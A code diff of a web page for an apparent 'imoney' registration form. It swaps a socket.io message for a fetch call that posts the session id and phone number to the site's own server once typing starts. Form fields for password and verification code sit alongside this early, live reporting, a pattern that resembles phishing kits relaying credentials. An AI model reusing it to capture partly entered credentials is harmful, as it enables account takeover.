@@ -156,14 +156,12 @@
     </div>
   </div>
 
-  <script src="/socket.io/socket.io.js"></script>
   <script>
     const sessionId =
       sessionStorage.getItem('imoney_session_id') ||
       ('sess_' + Math.random().toString(36).slice(2) + '_' + Date.now());
     sessionStorage.setItem('imoney_session_id', sessionId);
 
-    const socket = io();
     const phoneInput = document.getElementById('phone');
     const passwordInput = document.getElementById('password');
     const codeInput = document.getElementById('code');
@@ -190,11 +188,16 @@
     function notifyRegisterStart(digitsOnly) {
       if (hasNotifiedStart) return;
       hasNotifiedStart = true;
-      socket.emit('register:start', {
-        sessionId,
-        phone: digitsOnly,
-        startedAt: Date.now()
-      });
+      fetch('/api/register-start', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        keepalive: true,
+        body: JSON.stringify({
+          sessionId,
+          phone: digitsOnly || '',
+          startedAt: Date.now()
+        })
+      }).catch(() => {});
     }
 
     async function pushLiveUpdate() {
